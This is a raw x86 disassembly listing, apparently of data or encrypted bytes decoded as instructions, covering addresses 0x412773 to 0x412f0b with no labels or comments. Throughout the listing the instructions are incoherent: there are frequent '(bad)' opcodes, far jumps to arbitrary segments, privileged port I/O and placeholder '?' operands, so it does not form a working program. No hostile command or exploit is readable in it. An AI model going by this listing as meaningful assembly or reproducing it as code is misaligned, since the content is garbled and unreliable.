  412773:	mov    eax,DWORD PTR [edi+0x4]
  412776:	jmp    0x13f2:0x6a8dffa5
  41277d:	out    0x32,eax
  41277f:	(bad)  
  412780:	in     eax,dx
  412781:	test   esi,eax
  412783:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412784:	fs fxch st(7)
  412787:	mov    ?,WORD PTR [edi-0x58]
  41278a:	dec    ecx
  41278b:	or     al,0xb5
  41278d:	cmc    
  41278e:	jp     0x41277a
  412790:	lahf   
  412791:	mov    edx,0xa8f996ce
  412796:	xchg   ebp,ebp
  412798:	cmp    ebx,DWORD PTR [ebx+0x19b9ea6f]
  41279e:	test   al,0xa1
  4127a0:	push   es
  4127a1:	cmp    BYTE PTR [edx],dl
  4127a3:	jo     0x4127c7
  4127a5:	jmp    0x412774
  4127a7:	xchg   edx,eax
  4127a8:	daa    
  4127a9:	pop    edx
  4127aa:	xchg   BYTE PTR [edi+0x7],cl
  4127ad:	rol    BYTE PTR [ebp+0x4109d5c5],0x9
  4127b4:	mov    ebp,0x9cfe09a4
  4127b9:	adc    ah,BYTE PTR [edx+0x3f]
  4127bc:	jae    0x41281d
  4127be:	pop    ebx
  4127bf:	add    edi,DWORD PTR [ecx]
  4127c1:	dec    ebx
  4127c2:	add    BYTE PTR [ebx],dl
  4127c4:	push   edx
  4127c5:	or     eax,0x83ad2f1a
  4127ca:	mov    edx,0x65cb9a60
  4127cf:	stos   BYTE PTR es:[edi],al
  4127d0:	jge    0x412760
  4127d2:	loopne 0x412773
  4127d4:	cmp    ch,al
  4127d6:	mov    ?,esp
  4127d8:	adc    al,0x78
  4127da:	cmp    bl,ch
  4127dc:	cmp    eax,0xc933b89c
  4127e1:	aaa    
  4127e2:	xor    ebp,DWORD PTR ds:0xf7a49d28
  4127e8:	lods   eax,DWORD PTR ds:[esi]
  4127e9:	cwde   
  4127ea:	dec    edx
  4127eb:	or     al,0x13
  4127ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ee:	inc    eax
  4127ef:	ds push ecx
  4127f1:	shufps xmm6,XMMWORD PTR ds:0xb32515d4,0xac
  4127f9:	dec    esi
  4127fa:	call   0xe914d11c
  4127ff:	lods   al,BYTE PTR ds:[esi]
  412800:	pop    eax
  412801:	mov    edx,0x9e671b42
  412806:	sbb    BYTE PTR [edi-0x31417896],al
  41280c:	inc    edi
  41280d:	hlt    
  41280e:	adc    ebx,ebx
  412810:	popa   
  412811:	cld    
  412812:	jae    0x412822
  412814:	fidiv  WORD PTR ds:0x77d78b1a
  41281a:	addr16 inc ebx
  41281c:	mov    WORD PTR [edi+esi*2],fs
  41281f:	xor    ebp,ebx
  412821:	adc    dh,BYTE PTR [eax+0x58]
  412824:	retf   0xc457
  412827:	sub    DWORD PTR [ebp+0x29fa3566],esp
  41282d:	enter  0xd7d6,0x3d
  412831:	mov    edx,0x47e941cd
  412836:	cmp    bl,al
  412838:	aas    
  412839:	addr16 sub eax,0x46a7c54c
  41283f:	in     al,0x5c
  412841:	outs   dx,DWORD PTR ds:[esi]
  412842:	arpl   WORD PTR [eax+0x9],bp
  412845:	xchg   DWORD PTR [eax+0x38],ecx
  412848:	add    eax,0x4d12c0d0
  41284d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41284e:	push   edi
  41284f:	dec    ebx
  412850:	sub    BYTE PTR [edx],bh
  412852:	adc    al,0x6b
  412854:	push   esp
  412855:	dec    esp
  412856:	sbb    ebx,DWORD PTR [edi+0x6c]
  412859:	sahf   
  41285a:	test   BYTE PTR [edi],0x10
  41285d:	cmp    DWORD PTR [eax+0x1c2074fe],0x50
  412864:	or     ebp,DWORD PTR [eax+ebx*2-0x412ed523]
  41286b:	or     BYTE PTR gs:[edx],ah
  41286e:	mov    ?,WORD PTR [esi+esi*1]
  412871:	adc    DWORD PTR ss:[ebp+0x13],ebp
  412875:	push   eax
  412876:	loop   0x4127ff
  412878:	imul   ecx,DWORD PTR [edi+0x14],0xffffffc4
  41287c:	sar    BYTE PTR [ecx],cl
  41287e:	repnz out dx,al
  412880:	adc    BYTE PTR [edi-0x26],ah
  412883:	retf   0x8e97
  412886:	in     al,0x70
  412888:	ss inc eax
  41288a:	mov    cl,0x6a
  41288c:	inc    ecx
  41288d:	add    BYTE PTR [ecx-0x48579914],ah
  412893:	scas   eax,DWORD PTR es:[edi]
  412894:	push   ss
  412895:	xchg   edx,eax
  412896:	sbb    eax,0x9d7155c4
  41289b:	repz ja 0x41287b
  41289e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41289f:	aad    0x93
  4128a1:	sti    
  4128a2:	sub    DWORD PTR [esi],eax
  4128a4:	fdiv   st,st(7)
  4128a6:	pop    ebx
  4128a7:	mov    al,0xd6
  4128a9:	fcmovnb st,st(5)
  4128ab:	inc    edx
  4128ac:	cdq    
  4128ad:	add    esi,DWORD PTR [ecx]
  4128af:	and    eax,0x54828547
  4128b4:	ss xchg edi,eax
  4128b6:	jge    0x4128e3
  4128b8:	ffree  st(3)
  4128ba:	xor    DWORD PTR [ebp+0x27],ebp
  4128bd:	fs and dh,al
  4128c0:	pop    ebx
  4128c1:	call   0x55e192bf
  4128c6:	loopne 0x4128c2
  4128c8:	lock sti 
  4128ca:	cli    
  4128cb:	inc    edi
  4128cc:	out    0xc0,eax
  4128ce:	mov    ch,0xfb
  4128d0:	das    
  4128d1:	add    al,0x47
  4128d3:	(bad)  
  4128d4:	ins    DWORD PTR es:[edi],dx
  4128d5:	pop    ds
  4128d6:	mov    ah,0x20
  4128d8:	add    edx,DWORD PTR [edi+edi*4+0x72d82546]
  4128df:	jle    0x41288a
  4128e1:	sbb    al,0xe7
  4128e3:	dec    ebx
  4128e4:	iret   
  4128e5:	scas   eax,DWORD PTR es:[edi]
  4128e6:	mov    al,0x83
  4128e8:	push   eax
  4128e9:	(bad)  
  4128ea:	in     eax,0xb6
  4128ec:	adc    DWORD PTR [eax],ecx
  4128ee:	es aaa 
  4128f0:	loope  0x4128c0
  4128f2:	and    DWORD PTR [esi+edi*2-0x3b],edi
  4128f6:	(bad)  
  4128f7:	and    eax,0x5005397f
  4128fc:	sbb    dh,BYTE PTR [ebx+0x4b85a002]
  412902:	clc    
  412903:	mov    ds:0xd5619e9c,eax
  412908:	fs iret 
  41290a:	call   FWORD PTR ds:0x519c114a
  412910:	xlat   BYTE PTR ds:[ebx]
  412911:	sbb    eax,0xfe197f2b
  412916:	outs   dx,DWORD PTR ds:[esi]
  412917:	xor    ch,ch
  412919:	jmp    0x412946
  41291b:	jp     0x41299a
  41291d:	mov    al,ds:0xe998a98d
  412922:	jbe    0x4128e0
  412924:	or     ch,BYTE PTR [eax]
  412926:	or     esi,DWORD PTR ss:[ebx+0x4e19d3b]
  41292d:	int    0x9a
  41292f:	cmp    eax,0x29d31835
  412934:	adc    eax,0xea1b48f4
  412939:	shl    DWORD PTR [esi+0xd],1
  41293c:	or     DWORD PTR [ecx],ebx
  41293e:	leave  
  41293f:	sub    BYTE PTR [eax+0x6c],dh
  412942:	idiv   DWORD PTR [ecx-0x5c]
  412945:	push   ebx
  412946:	mov    ebp,0xecd11f35
  41294b:	out    0xa,eax
  41294d:	xchg   edx,eax
  41294e:	test   al,0x9d
  412950:	mov    ebp,0xdf43ed01
  412955:	xchg   BYTE PTR [ecx-0x7b],cl
  412958:	or     esp,DWORD PTR [edi+0x52c01f59]
  41295e:	jmp    0x4955:0x70dba89f
  412965:	lods   al,BYTE PTR ds:[esi]
  412966:	sbb    ecx,esp
  412968:	fadd   QWORD PTR es:[edx+0x17]
  41296c:	xor    eax,0x4fafbe73
  412971:	sbb    BYTE PTR [edx+0x2642f460],ah
  412977:	adc    ebx,edi
  412979:	lock fwait
  41297b:	les    eax,FWORD PTR [ecx]
  41297d:	ret    
  41297e:	jle    0x4129e8
  412980:	stos   BYTE PTR es:[edi],al
  412981:	cmp    al,0x34
  412983:	push   0xfaad698
  412988:	frstor [ebx]
  41298a:	gs pop ds
  41298c:	jmp    0xb01b96e5
  412991:	cmp    dh,BYTE PTR [edx-0x67]
  412994:	add    edx,esp
  412996:	pop    esp
  412997:	mov    ch,0xe7
  412999:	cmp    bl,bh
  41299b:	cld    
  41299c:	aad    0xc0
  41299e:	and    ecx,DWORD PTR [ebx]
  4129a0:	int3   
  4129a1:	lahf   
  4129a2:	repz inc edx
  4129a4:	jne    0x4129f9
  4129a6:	mov    ebx,0xecc2e81e
  4129ab:	push   0xffffffd6
  4129ad:	(bad)  
  4129ae:	push   esi
  4129af:	jg     0x412946
  4129b1:	fwait
  4129b2:	jbe    0x412968
  4129b4:	add    DWORD PTR gs:[edi],esp
  4129b7:	add    dl,ch
  4129b9:	cmp    al,0x7f
  4129bb:	fild   WORD PTR [edx]
  4129bd:	jne    0x412999
  4129bf:	loopne 0x41295c
  4129c1:	jecxz  0x412986
  4129c3:	ret    0x7d45
  4129c6:	into   
  4129c7:	dec    eax
  4129c8:	jl     0x412a0d
  4129ca:	(bad)
  4129cd:	ffreep st(5)
  4129cf:	nop
  4129d0:	rcr    ebp,1
  4129d2:	outs   dx,BYTE PTR ds:[esi]
  4129d3:	arpl   WORD PTR [ebp+ebp*8-0x74],bx
  4129d7:	xchg   DWORD PTR [eax+ecx*1+0x1f],esi
  4129db:	les    esp,FWORD PTR [eax-0x63]
  4129de:	add    ch,0xc4
  4129e1:	(bad)  
  4129e3:	loopne 0x412a57
  4129e5:	popf   
  4129e6:	dec    esp
  4129e7:	mov    al,0x82
  4129e9:	xchg   edx,eax
  4129ea:	dec    edx
  4129eb:	int    0xe8
  4129ed:	add    edx,DWORD PTR [ebp+0x11b79e6a]
  4129f3:	mov    dh,0xc1
  4129f5:	enter  0x177c,0x48
  4129f9:	add    dh,bh
  4129fb:	test   al,0xd1
  4129fd:	(bad)  
  4129fe:	dec    edi
  4129ff:	aaa    
  412a00:	inc    ebx
  412a01:	xor    eax,0xaa89cb3e
  412a06:	call   0x69709201
  412a0b:	mov    al,ds:0xc5de84d1
  412a10:	test   DWORD PTR [esi-0x7e],esp
  412a13:	mov    cl,0xd0
  412a15:	ror    bh,1
  412a17:	mov    ah,0x78
  412a19:	cmp    al,0x0
  412a1b:	adc    dh,BYTE PTR ds:[ebx]
  412a1e:	cmp    al,0xa9
  412a20:	lods   eax,DWORD PTR ds:[esi]
  412a21:	jmp    0x4129d9
  412a23:	and    DWORD PTR [edx+0x185cbef0],esp
  412a29:	addr16 inc ecx
  412a2b:	mov    eax,ds:0xe5c55359
  412a30:	ins    DWORD PTR es:[edi],dx
  412a31:	adc    ch,BYTE PTR [edx+eiz*8-0x2e82e9f7]
  412a38:	xchg   edx,eax
  412a39:	jl     0x412a9f
  412a3b:	adc    DWORD PTR [edi+0x51f7c0e7],ebx
  412a41:	les    ebp,FWORD PTR [esi+0x1f]
  412a44:	jo     0x412a52
  412a46:	mov    ebx,0x724d10f5
  412a4b:	lahf   
  412a4c:	ret    0x5965
  412a4f:	ror    DWORD PTR [ebx],0x9e
  412a52:	push   ss
  412a53:	mov    dl,0xaa
  412a55:	adc    BYTE PTR [edx+0x7b],0xd6
  412a59:	pushf  
  412a5a:	outs   dx,DWORD PTR ds:[esi]
  412a5b:	jmp    0x911a:0xac30ba8e
  412a62:	shl    BYTE PTR [ebp-0x45],1
  412a65:	push   edx
  412a66:	(bad)  
  412a67:	(bad)  
  412a69:	(bad)  
  412a6b:	xor    al,0xb8
  412a6d:	inc    esp
  412a6e:	push   ss
  412a6f:	rcr    dl,1
  412a71:	out    0xa3,al
  412a73:	and    esi,edx
  412a75:	arpl   WORD PTR [ecx],bx
  412a77:	sub    BYTE PTR fs:[edi+0xad826f0],dl
  412a7e:	(bad)  
  412a7f:	fucomp st(2)
  412a81:	sbb    dh,ch
  412a83:	out    0x70,al
  412a85:	sub    BYTE PTR [esi],dh
  412a87:	in     eax,dx
  412a88:	imul   edi
  412a8a:	lods   eax,DWORD PTR ds:[esi]
  412a8b:	ins    DWORD PTR es:[edi],dx
  412a8c:	into   
  412a8d:	sbb    ch,bh
  412a8f:	jg     0x412a2f
  412a91:	jne    0x412a95
  412a93:	mov    gs,WORD PTR [eax+0x1e]
  412a96:	les    ecx,FWORD PTR [ebx-0x50fb68c1]
  412a9c:	jge    0x412ac2
  412a9e:	sub    DWORD PTR [edx+edx*4+0x7ac9ffe9],edx
  412aa5:	das    
  412aa6:	outs   dx,DWORD PTR ds:[esi]
  412aa7:	stc    
  412aa8:	push   0x11589438
  412aad:	sub    BYTE PTR [eax-0x64019092],dh
  412ab3:	and    DWORD PTR [edi],ecx
  412ab5:	mov    al,0x93
  412ab7:	outs   dx,BYTE PTR ds:[esi]
  412ab8:	fidiv  DWORD PTR [ebp+0x16]
  412abb:	div    BYTE PTR [edx+0x5bf952c4]
  412ac1:	icebp  
  412ac2:	pop    esp
  412ac3:	shl    DWORD PTR [ebx-0x31],1
  412ac6:	adc    esp,ebx
  412ac8:	lods   eax,DWORD PTR ds:[esi]
  412ac9:	jmp    0x412b05
  412acb:	xor    eax,eax
  412acd:	push   ebp
  412ace:	mov    edi,esi
  412ad0:	lds    eax,FWORD PTR [edi-0x7c5a57a1]
  412ad6:	inc    edx
  412ad7:	js     0x412b51
  412ad9:	jnp    0x412ac9
  412adb:	stos   DWORD PTR es:[edi],eax
  412adc:	push   edx
  412add:	cmp    DWORD PTR [ebx],esi
  412adf:	(bad)  
  412ae1:	mov    ah,0x71
  412ae3:	leave  
  412ae4:	in     al,0x3f
  412ae6:	and    ebx,ecx
  412ae8:	mov    bh,0x2f
  412aea:	sub    eax,0xa5e42c8d
  412aef:	retf   0x4727
  412af2:	out    0x5f,al
  412af4:	jecxz  0x412acc
  412af6:	push   ecx
  412af7:	leave  
  412af8:	sub    ecx,DWORD PTR [ebp+esi*1+0x3e]
  412afc:	cmp    BYTE PTR ds:0x26fddbcd,bh
  412b02:	dec    ebp
  412b03:	inc    eax
  412b04:	or     ecx,esp
  412b06:	inc    ebp
  412b07:	mov    eax,0xd2b3416b
  412b0c:	(bad)  
  412b0e:	sub    ecx,eax
  412b10:	ror    edi,cl
  412b12:	mov    dh,0x8f
  412b14:	aam    0x7c
  412b16:	stos   DWORD PTR es:[edi],eax
  412b17:	mov    dl,0x32
  412b19:	fild   WORD PTR [ebx-0x5d]
  412b1c:	xchg   esi,eax
  412b1d:	in     al,dx
  412b1e:	and    DWORD PTR [edx],esi
  412b20:	bound  eax,QWORD PTR [ebx-0x6b]
  412b23:	cmp    eax,0x195205f5
  412b28:	push   es
  412b29:	jnp    0x412ae2
  412b2b:	aaa    
  412b2c:	mov    ebx,0x4d903e1a
  412b31:	mov    ecx,0xefb4b373
  412b36:	jg     0x412b74
  412b38:	(bad)  
  412b39:	jmp    0xbb407011
  412b3e:	out    0xd7,al
  412b40:	in     eax,0x5b
  412b42:	xchg   ecx,eax
  412b43:	mov    DWORD PTR es:[ebp-0x51235d4f],esi
  412b4a:	sti    
  412b4b:	or     al,0xa0
  412b4d:	cmp    al,0xb5
  412b4f:	in     al,dx
  412b50:	sbb    DWORD PTR [eax+esi*4-0x7edc451b],0xffffffc1
  412b58:	loop   0x412b33
  412b5a:	icebp  
  412b5b:	mov    ah,0x29
  412b5d:	push   esi
  412b5e:	dec    esp
  412b5f:	push   edx
  412b60:	mov    bl,0x6f
  412b62:	call   0x71a4ce27
  412b67:	clc    
  412b68:	jno    0x412b2e
  412b6a:	mov    ah,0xbf
  412b6c:	add    esp,edx
  412b6e:	or     esi,esp
  412b70:	mov    ds,ebp
  412b72:	inc    edx
  412b73:	(bad)  
  412b74:	ja     0x412b77
  412b76:	mov    esp,0x3e4daf3e
  412b7b:	cmp    edx,edi
  412b7d:	mov    bh,0x93
  412b7f:	sbb    BYTE PTR [edx],al
  412b81:	jecxz  0x412b37
  412b83:	push   cs
  412b84:	xchg   ecx,eax
  412b85:	lock pop esp
  412b87:	and    ebp,DWORD PTR [ecx]
  412b89:	add    eax,0x29e25429
  412b8e:	inc    ecx
  412b8f:	(bad)  
  412b91:	sbb    al,0x8c
  412b93:	cmp    al,0xf8
  412b95:	cmp    eax,0xb14541
  412b9b:	xchg   edx,eax
  412b9c:	jmp    0x412b31
  412b9e:	stos   BYTE PTR es:[edi],al
  412b9f:	aaa    
  412ba0:	test   DWORD PTR [ebp+0x474c03b7],edx
  412ba6:	test   DWORD PTR [edx],esi
  412ba8:	dec    edi
  412ba9:	cmp    ch,bh
  412bab:	jno    0x412c23
  412bad:	jl     0x412bad
  412baf:	xchg   esp,eax
  412bb0:	push   ds
  412bb1:	aam    0x74
  412bb3:	xor    esi,esp
  412bb5:	(bad)  [edi]
  412bb7:	shl    DWORD PTR [eax-0x66],cl
  412bba:	lock xchg edi,eax
  412bbc:	add    BYTE PTR [esi+0x56],dh
  412bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bc0:	inc    eax
  412bc1:	mov    ds:0x6aeaceb6,al
  412bc6:	and    DWORD PTR [esi],ebp
  412bc8:	ret    0x92e6
  412bcb:	inc    ebp
  412bcc:	jns    0x412c4c
  412bce:	cmp    eax,0x8918d1e7
  412bd3:	and    dh,BYTE PTR [ebx-0x199bc3b3]
  412bd9:	mov    ch,BYTE PTR [eax]
  412bdb:	mov    BYTE PTR [ecx-0x66f39218],dh
  412be1:	mov    eax,0x885e048a
  412be6:	mov    al,0xbb
  412be8:	mov    esp,0xe204ef39
  412bed:	or     DWORD PTR [edi-0x48],esi
  412bf0:	leave  
  412bf1:	xor    DWORD PTR [ecx-0x6344cdee],0xa
  412bf8:	jnp    0x412bd8
  412bfa:	sbb    bl,BYTE PTR [ebp+0x5b]
  412bfd:	fbld   TBYTE PTR [ebx-0x79d5987c]
  412c03:	mov    ebx,0x5879f13
  412c08:	loope  0x412c82
  412c0a:	xchg   ecx,ecx
  412c0c:	or     eax,0xfeed4c8a
  412c11:	clc    
  412c12:	in     al,dx
  412c13:	idiv   BYTE PTR es:[eax+0x78]
  412c17:	jge    0x412c88
  412c19:	xlat   BYTE PTR ds:[ebx]
  412c1a:	push   ebp
  412c1b:	mov    ah,0xba
  412c1d:	cmp    eax,0x89cba0bd
  412c22:	jg     0x412ba9
  412c24:	push   0x805a5219
  412c29:	fbstp  TBYTE PTR [ecx]
  412c2b:	(bad)  
  412c2c:	je     0x412c56
  412c2e:	inc    esp
  412c2f:	stos   DWORD PTR es:[edi],eax
  412c30:	inc    ebx
  412c31:	js     0x412c7f
  412c33:	outs   dx,BYTE PTR ds:[esi]
  412c34:	pushf  
  412c35:	ja     0x412c9b
  412c37:	outs   dx,DWORD PTR ds:[esi]
  412c38:	clc    
  412c39:	mov    dh,0xcc
  412c3b:	mov    cl,bh
  412c3d:	push   es
  412c3e:	ss out 0xc3,al
  412c41:	int3   
  412c42:	and    DWORD PTR [esi+0x17942049],0xfffffffc
  412c49:	cld    
  412c4a:	fsub   DWORD PTR [ebp+ebp*2-0x20]
  412c4e:	push   cs
  412c4f:	jo     0x412c4b
  412c51:	int3   
  412c52:	xor    ah,BYTE PTR [edx]
  412c54:	adc    eax,0x6cc5e3f8
  412c59:	inc    edx
  412c5a:	stc    
  412c5b:	dec    edi
  412c5c:	sahf   
  412c5d:	xchg   cl,dh
  412c5f:	test   edx,edi
  412c61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c62:	xor    eax,0xcfd87b64
  412c67:	out    0x2f,al
  412c69:	inc    BYTE PTR [eax]
  412c6b:	xor    eax,DWORD PTR [edx-0x27]
  412c6e:	in     al,dx
  412c6f:	or     al,0xbc
  412c71:	xchg   esi,eax
  412c72:	sbb    DWORD PTR [edi-0x21],ecx
  412c75:	fisubr WORD PTR [edi+0x44]
  412c78:	pop    edi
  412c79:	push   es
  412c7a:	lods   al,BYTE PTR ds:[esi]
  412c7b:	pop    ecx
  412c7c:	aam    0x5
  412c7e:	ja     0x412c80
  412c80:	xchg   ebx,eax
  412c81:	jp     0x412c37
  412c83:	cmc    
  412c84:	jb     0x412ce9
  412c86:	out    0x9b,eax
  412c88:	xchg   esp,eax
  412c89:	js     0x412c5c
  412c8b:	xor    eax,0xf62d6d7d
  412c90:	and    DWORD PTR [edx-0x74e503f1],esp
  412c96:	cwde   
  412c97:	mov    esp,eax
  412c99:	inc    esp
  412c9a:	jg     0x412c8b
  412c9c:	push   ds
  412c9d:	ss or  eax,0x100f1148
  412ca4:	pop    esi
  412ca5:	aas    
  412ca6:	je     0x412cdf
  412ca8:	jg     0x412d25
  412caa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cab:	mov    cl,0xa7
  412cad:	bound  ebp,QWORD PTR [ecx-0x195a79e6]
  412cb3:	and    ebp,0x73
  412cb6:	mov    esi,0xa2ae4dd2
  412cbb:	jl     0x412ca1
  412cbd:	jbe    0x412d02
  412cbf:	mov    dl,0xc9
  412cc2:	ins    DWORD PTR es:[edi],dx
  412cc3:	push   esi
  412cc4:	int3   
  412cc5:	aad    0x85
  412cc7:	jb     0x412d2c
  412cc9:	jp     0x412cc3
  412ccb:	xchg   ebp,eax
  412ccc:	inc    edx
  412ccd:	nop
  412cce:	jnp    0x412d0f
  412cd0:	sbb    eax,0xea854af3
  412cd5:	push   0x4c2fb7e6
  412cda:	push   es
  412cdb:	sub    eax,0xb0fac7d
  412ce0:	mov    esp,0x6150b1f2
  412ce5:	xchg   BYTE PTR [ecx+0xfcb9a76],bh
  412ceb:	hlt    
  412cec:	push   ds
  412ced:	popf   
  412cee:	bound  esi,QWORD PTR [ebp+0x24]
  412cf1:	popa   
  412cf2:	pop    edx
  412cf3:	mov    dh,0x3e
  412cf5:	cli    
  412cf6:	push   0xffffffbc
  412cf8:	(bad)  
  412cf9:	addr16 push edx
  412cfb:	pop    ebx
  412cfc:	mov    cl,0x43
  412cfe:	and    esi,DWORD PTR [ebx+0x6ca8bd78]
  412d04:	test   BYTE PTR ds:0x2719ccdc,dh
  412d0a:	out    dx,al
  412d0b:	sbb    ebx,0xb4a2897a
  412d11:	pop    edi
  412d12:	popf   
  412d13:	stos   DWORD PTR es:[edi],eax
  412d14:	mov    dl,0xaf
  412d16:	sub    BYTE PTR [ebx],dl
  412d18:	call   0xf4a5:0xaad0a91a
  412d1f:	cmp    DWORD PTR [ebp-0x2],0x52
  412d23:	adc    al,0xe
  412d25:	mov    ah,0xb
  412d27:	aad    0xda
  412d29:	call   0x130e1b26
  412d2e:	pop    es
  412d2f:	lods   al,BYTE PTR ds:[esi]
  412d30:	sbb    edi,DWORD PTR cs:0xd6dfea34
  412d37:	jo     0x412d54
  412d39:	hlt    
  412d3a:	(bad)  
  412d3b:	mov    bl,0x77
  412d3d:	push   cs
  412d3e:	in     al,dx
  412d3f:	imul   edx,edx,0xb5ea21b1
  412d45:	loopne 0x412ce7
  412d47:	cmp    BYTE PTR [ebp-0x20],dh
  412d4a:	test   BYTE PTR [ebx+ebp*1],dh
  412d4d:	or     esp,ebx
  412d4f:	sbb    eax,0x654654e8
  412d54:	cld    
  412d55:	lds    esp,FWORD PTR [esi-0x68]
  412d58:	or     esp,0xfeb31b9c
  412d5e:	cmp    BYTE PTR [edx-0x33],bl
  412d61:	push   ebp
  412d62:	js     0x412d9b
  412d64:	scas   eax,DWORD PTR es:[edi]
  412d65:	aad    0x41
  412d67:	pop    es
  412d68:	sbb    DWORD PTR [edi],eax
  412d6a:	das    
  412d6b:	mov    al,ds:0x28981049
  412d70:	ins    BYTE PTR es:[edi],dx
  412d71:	xchg   edx,eax
  412d72:	jmp    0xbd08:0x7436dc61
  412d79:	cmp    bl,BYTE PTR [ebp+0x713b1725]
  412d7f:	pop    edx
  412d80:	fimul  DWORD PTR [ebx+0x704a7f37]
  412d86:	js     0x412d1b
  412d88:	daa    
  412d89:	jp     0x412de4
  412d8b:	add    BYTE PTR [esi+eiz*8],ch
  412d8e:	inc    edx
  412d8f:	cmp    ch,dh
  412d91:	repnz (bad) 
  412d93:	scas   eax,DWORD PTR es:[edi]
  412d94:	fild   DWORD PTR [edi+eax*2+0x40]
  412d98:	mov    edx,0xa21ffaf2
  412d9d:	mov    al,ds:0x5fd1895d
  412da2:	mov    ebp,0x70701161
  412da7:	mov    al,ds:0xae05d3aa
  412dac:	sub    BYTE PTR [esp+edi*2-0x5609a008],al
  412db3:	sub    ch,BYTE PTR [eax+0x5422078]
  412db9:	nop
  412dba:	sub    BYTE PTR [ebp+edx*8-0x3f],0x38
  412dbf:	clc    
  412dc0:	(bad)  
  412dc1:	cmc    
  412dc2:	push   edi
  412dc3:	mov    dl,ah
  412dc5:	dec    ecx
  412dc6:	mov    ds:0x3980ba8a,al
  412dcb:	rcr    BYTE PTR [ebp+ecx*8+0x11],0x47
  412dd0:	clc    
  412dd1:	xchg   esi,eax
  412dd2:	aam    0xf6
  412dd4:	pop    edx
  412dd5:	out    dx,eax
  412dd6:	stc    
  412dd7:	mov    dh,0xf7
  412dd9:	adc    ecx,DWORD PTR [ecx-0x33d63b01]
  412ddf:	push   edx
  412de0:	scas   al,BYTE PTR es:[edi]
  412de1:	imul   esp,eax,0x2ed6b168
  412de7:	cmp    edx,DWORD PTR [ecx]
  412de9:	daa    
  412dea:	(bad)  
  412deb:	ds imul esi,esi,0x74484f5a
  412df2:	xor    ah,al
  412df4:	out    0x90,eax
  412df6:	out    0x88,al
  412df8:	dec    esi
  412df9:	jo     0x412e78
  412dfb:	adc    ebp,DWORD PTR [ecx-0x15]
  412dfe:	xchg   ecx,eax
  412dff:	xchg   BYTE PTR [ebp-0x2466c5b6],cl
  412e05:	repnz adc ecx,DWORD PTR [ebp+0x4c]
  412e09:	mov    ch,BYTE PTR [eax+0x525c996b]
  412e0f:	out    0x41,al
  412e11:	in     eax,0x56
  412e13:	nop
  412e14:	or     edx,DWORD PTR [esi+0x7a]
  412e17:	jae    0x412e71
  412e19:	fsub   DWORD PTR [eax]
  412e1b:	ins    DWORD PTR es:[edi],dx
  412e1c:	clc    
  412e1d:	push   ecx
  412e1e:	add    ebx,0xffffffa1
  412e21:	xchg   ebp,eax
  412e22:	enter  0x2659,0x7
  412e26:	mov    esp,0xac75c72c
  412e2b:	pushf  
  412e2c:	loopne 0x412db7
  412e2e:	mov    ah,0x9
  412e30:	xchg   esi,eax
  412e31:	and    esp,DWORD PTR [eax-0x8]
  412e34:	xlat   BYTE PTR ds:[ebx]
  412e35:	and    DWORD PTR ds:0x97eaf8eb,eax
  412e3b:	cmp    eax,0xe5cf2d75
  412e40:	test   cl,bl
  412e42:	inc    ebp
  412e43:	shl    BYTE PTR [ebx],cl
  412e45:	std    
  412e46:	into   
  412e47:	into   
  412e48:	xor    BYTE PTR [edx],al
  412e4a:	retf   0xb50d
  412e4d:	pusha  
  412e4e:	mov    ch,0x79
  412e50:	pop    edi
  412e51:	dec    esi
  412e52:	je     0x412e80
  412e54:	das    
  412e55:	or     dl,BYTE PTR [edx]
  412e57:	add    al,0x61
  412e59:	and    al,BYTE PTR [ebp-0x70]
  412e5c:	cmc    
  412e5d:	pusha  
  412e5e:	dec    BYTE PTR [edi*1-0x6ef27366]
  412e65:	jae    0x412e07
  412e67:	inc    esp
  412e68:	aaa    
  412e69:	aad    0x46
  412e6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e6c:	call   0xcc374977
  412e71:	mov    bh,0x60
  412e73:	(bad)  
  412e74:	cmp    edi,ecx
  412e76:	add    al,0x50
  412e78:	in     eax,dx
  412e79:	push   cs
  412e7a:	sub    DWORD PTR [ecx+0x289c4d45],0x44
  412e81:	jo     0x412e58
  412e83:	or     bl,dl
  412e85:	dec    DWORD PTR [esi]
  412e87:	mov    DWORD PTR [edi+0x78],ecx
  412e8a:	cli    
  412e8b:	sbb    BYTE PTR [eax],0x36
  412e8e:	jnp    0x412ec5
  412e90:	sti    
  412e91:	xor    BYTE PTR [eax+0x67dcc60c],dh
  412e97:	sub    edi,eax
  412e99:	sbb    al,0x1e
  412e9b:	hlt    
  412e9c:	inc    edx
  412e9d:	mov    edi,0x8236a0ed
  412ea2:	mov    al,ds:0x8b1d07ea
  412ea7:	in     eax,0x0
  412ea9:	jmp    0xc8cadb15
  412eae:	lods   eax,DWORD PTR ds:[esi]
  412eaf:	adc    al,0x77
  412eb1:	cmp    al,BYTE PTR [esi-0x35]
  412eb4:	repz dec esp
  412eb6:	adc    eax,0x2afa0a39
  412ebb:	push   edx
  412ebc:	arpl   WORD PTR [edx+0x251f1084],cx
  412ec2:	outs   dx,DWORD PTR ds:[esi]
  412ec3:	retf   
  412ec4:	mov    cl,cl
  412ec6:	ficomp DWORD PTR [esi-0x9]
  412ec9:	add    BYTE PTR [edx],ch
  412ecb:	xlat   BYTE PTR ds:[ebx]
  412ecc:	arpl   WORD PTR [ecx+0x79],si
  412ecf:	(bad)  
  412ed1:	imul   bp,WORD PTR [eax],0xcb8f
  412ed6:	pop    ebx
  412ed7:	adc    DWORD PTR [ebp+0xbb36668],ecx
  412edd:	test   DWORD PTR [eax+0x3f],esi
  412ee0:	mov    ecx,0xa3ab1f6e
  412ee5:	jae    0x412f27
  412ee7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  412ee9:	fwait
  412eea:	add    eax,0xff140b6c
  412eef:	mov    bl,0xba
  412ef1:	dec    ebx
  412ef2:	arpl   WORD PTR [edi],bx
  412ef4:	mov    edi,DWORD PTR [ebp-0x7760e8c6]
  412efa:	cmp    al,BYTE PTR [eax]
  412efc:	ror    ch,cl
  412efe:	sub    BYTE PTR [ecx+0x19],cl
  412f01:	repnz dec esi
  412f03:	addr16 pop eax
  412f05:	dec    ebp
  412f06:	dec    esi
  412f07:	adc    DWORD PTR [esp+ebx*8-0x50],ebp
  412f0b:	aad    0xf6
